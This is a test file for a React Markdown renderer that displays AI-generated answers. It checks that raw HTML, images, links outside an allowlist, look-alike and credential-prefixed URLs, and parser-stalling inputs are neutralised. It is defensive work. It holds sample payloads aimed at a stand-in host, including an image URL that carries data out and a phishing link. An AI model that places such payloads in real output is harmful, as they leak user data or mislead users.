import { render, screen } from '@testing-library/react';
import { beforeEach, describe, expect, it } from 'vitest';

import { ENV } from '@/core/config';

import { MarkdownAnswer } from './MarkdownAnswer';

describe('MarkdownAnswer', () => {
  beforeEach(() => {
    (ENV as any).plugins.WALDUR_CORE = {
      AI_REPORTING_LINK_DOMAINS: 'docs.isambard.ac.uk, bristol.ac.uk',
    };
  });

  it('shows raw HTML as text instead of rendering it', () => {
    render(
      <MarkdownAnswer content='<iframe src="https://evil.example"></iframe>' />,
    );

    expect(screen.getByText(/<iframe/)).toBeInTheDocument();
  });

  it('does not load images, which could send data to another site', () => {
    render(<MarkdownAnswer content="![chart](https://evil.example/?d=x)" />);

    expect(screen.queryByRole('img')).not.toBeInTheDocument();
    expect(screen.getByText('chart')).toBeInTheDocument();
  });

  it('shows links as text with their address, not as clickable links', () => {
    render(
      <MarkdownAnswer content="[Log in here](https://evil.example/login)" />,
    );

    expect(screen.queryByRole('link')).not.toBeInTheDocument();
    expect(screen.getByText('Log in here')).toBeInTheDocument();
    expect(
      screen.getByText('(https://evil.example/login)', { exact: false }),
    ).toBeInTheDocument();
  });

  it('makes links to allowed domains clickable, in a new tab', () => {
    render(
      <MarkdownAnswer content="[Docs](https://docs.isambard.ac.uk/specs/)" />,
    );

    const link = screen.getByRole('link', { name: 'Docs' });
    expect(link).toHaveAttribute('href', 'https://docs.isambard.ac.uk/specs/');
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', 'noopener noreferrer');
  });

  it('allows subdomains of an allowed domain', () => {
    render(
      <MarkdownAnswer content="[HPC](https://www.bristol.ac.uk/supercomputing)" />,
    );

    expect(screen.getByRole('link', { name: 'HPC' })).toBeInTheDocument();
  });

  it.each([
    ['a look-alike domain', 'https://docs.isambard.ac.uk.evil.example/'],
    ['plain http', 'http://docs.isambard.ac.uk/'],
    ['a user:password prefix', 'https://docs.isambard.ac.uk@evil.example/'],
  ])('keeps %s as text', (_, href) => {
    render(<MarkdownAnswer content={`[Docs](${href})`} />);

    expect(screen.queryByRole('link')).not.toBeInTheDocument();
  });

  it('keeps every link as text when no domains are set', () => {
    (ENV as any).plugins.WALDUR_CORE = {};
    render(<MarkdownAnswer content="[Docs](https://docs.isambard.ac.uk/)" />);

    expect(screen.queryByRole('link')).not.toBeInTheDocument();
  });

  it('shows a bare address only once', () => {
    render(
      <MarkdownAnswer content="See https://evil.example/docs for more." />,
    );

    expect(
      screen.getByText('https://evil.example/docs', { exact: false }),
    ).toBeInTheDocument();
    expect(screen.queryByText(/\(https:\/\/evil/)).not.toBeInTheDocument();
  });

  it("does not make the portal's own address clickable unless it is listed", () => {
    render(
      <MarkdownAnswer
        content={`[Sign out](https://${window.location.hostname}/logout/)`}
      />,
    );

    expect(screen.queryByRole('link')).not.toBeInTheDocument();
  });

  it('stays fast on long underscore-separated text', () => {
    const start = Date.now();
    render(<MarkdownAnswer content={`${'a_'.repeat(200)}a and more`} />);

    expect(Date.now() - start).toBeLessThan(1000);
  });

  it('still escapes underscores in filenames', () => {
    render(<MarkdownAnswer content="See projects_per_university.png" />);

    expect(
      screen.getByText('See projects_per_university.png'),
    ).toBeInTheDocument();
  });

  it('still renders normal Markdown', () => {
    render(<MarkdownAnswer content="**Seventeen** projects" />);

    expect(
      screen.getByText('Seventeen', { selector: 'strong' }),
    ).toBeInTheDocument();
  });

  it('leaves underscored file names in link addresses alone', () => {
    render(
      <MarkdownAnswer content="[Guide](https://docs.isambard.ac.uk/my_user_guide.pdf)" />,
    );

    expect(screen.getByRole('link', { name: 'Guide' })).toHaveAttribute(
      'href',
      'https://docs.isambard.ac.uk/my_user_guide.pdf',
    );
  });

  it('leaves underscored file names in bare addresses alone', () => {
    render(
      <MarkdownAnswer content="See https://docs.isambard.ac.uk/my_user_guide.pdf" />,
    );

    expect(screen.getByRole('link')).toHaveAttribute(
      'href',
      'https://docs.isambard.ac.uk/my_user_guide.pdf',
    );
    expect(screen.queryByText(/\\_/)).not.toBeInTheDocument();
  });

  it('stays fast on many unclosed link brackets', () => {
    const start = performance.now();
    render(<MarkdownAnswer content={'](a_b'.repeat(20_000)} />);
    expect(performance.now() - start).toBeLessThan(2000);
  });
});
